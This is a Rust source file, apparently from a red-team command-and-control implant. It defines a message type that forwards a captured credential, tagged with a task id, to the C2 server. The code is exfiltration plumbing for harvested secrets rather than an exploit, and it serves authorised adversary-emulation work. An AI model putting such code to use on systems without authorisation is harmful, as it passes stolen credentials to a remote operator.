use super::{Dispatcher, Transport};
use anyhow::Result;
use pb::{c2::ReportCredentialRequest, eldritch::Credential};

/*
 * ReportCredentialMessage reports a credential captured by this tome's evaluation.
 */
#[cfg_attr(debug_assertions, derive(Debug, PartialEq))]
#[derive(Clone)]
pub struct ReportCredentialMessage {
    pub(crate) id: i64,
    pub(crate) credential: Credential,
}

impl Dispatcher for ReportCredentialMessage {
    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
        transport
            .report_credential(ReportCredentialRequest {
                task_id: self.id,
                credential: Some(self.credential),
            })
            .await?;
        Ok(())
    }
}
